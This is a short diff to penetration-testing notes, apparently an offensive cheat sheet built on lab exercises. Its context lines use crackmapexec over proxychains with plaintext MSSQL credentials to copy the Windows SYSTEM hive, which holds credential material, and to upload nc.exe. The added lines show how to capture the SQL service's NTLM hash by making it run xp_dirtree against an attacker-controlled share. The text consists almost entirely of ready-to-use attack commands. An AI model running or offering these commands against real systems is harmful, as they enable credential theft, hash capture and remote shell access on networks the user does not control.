@@ -84,3 +84,8 @@ Security Implications: Generally considered more secure as it leverages the secu
 proxychains4 -f /etc/proxychains4.conf crackmapexec(nxc) mssql 10.10.133.148 -u sql_svc -p Dolphin1 --get-file C:\\windows.old\\Windows\\System32\\SYSTEM /home/kali/Desktop/SYSTEM
 proxychains4 -f /etc/proxychains4.conf crackmapexec(nxc) mssql 10.10.133.148 -u sql_svc -p Dolphin1 --put-file nc.exe C:\\Users\\Public\\nc.exe
 ```
+### Capture Mssql Hash
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0d89e7ee-4d0a-420b-854e-2ab67c7f3a9a)
+```
+EXEC xp_dirtree '\\10.10.14.31\share', 1, 1
+```
